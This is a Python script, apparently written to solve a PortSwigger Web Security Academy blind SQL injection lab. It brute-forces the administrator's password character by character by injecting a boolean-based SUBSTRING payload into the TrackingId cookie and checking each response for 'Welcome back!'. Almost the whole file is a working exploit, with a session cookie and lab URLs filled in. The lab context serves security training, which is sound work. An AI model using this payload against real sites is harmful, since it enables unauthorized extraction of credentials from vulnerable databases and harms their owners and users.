import requests   #you have to import the requests library --> pip install requests

""" this script is brute forcing the password of an admin in data base sql injection in portswigger blind sqli lab 11 """



#list containing alphapets&numbers from 0-9
list =['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','0','1','2','3','4','5','6','7','8','9']

#from burp extension called (copy as python request) burp0_url,burp0_headers,burp0_cookies

burp0_url = "https://0aa400da032440c881d9209300d700cf.web-security-academy.net:443" #put your url instead

burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://0a97004603ed994e81b8e9c000ad005c.web-security-academy.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers"}

#the text should return to you if the query is right
text="Welcome back!"

#brute force 
for y in range(1,21): #20 chars of the password
    for i in list:
        payload = f"'+AND+(SELECT+SUBSTRING(password,{y},1)+FROM+users+WHERE+username+=+'administrator')+='{i}'+--++" #sql query that return true if  password[y] = i from list
        burp0_cookies = {"TrackingId": f"YBkrtaiJtUdZb79A{payload}" # put your TrackingId & session instead
                        ,"session": "y8vJQ1Z07mADC7CVTXlzUYFy2eJO9jOO"} 
        data=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
        if text in data.text: #if {Welcome back!} is in response then the query is true
            print(i,end="") #print the litter 


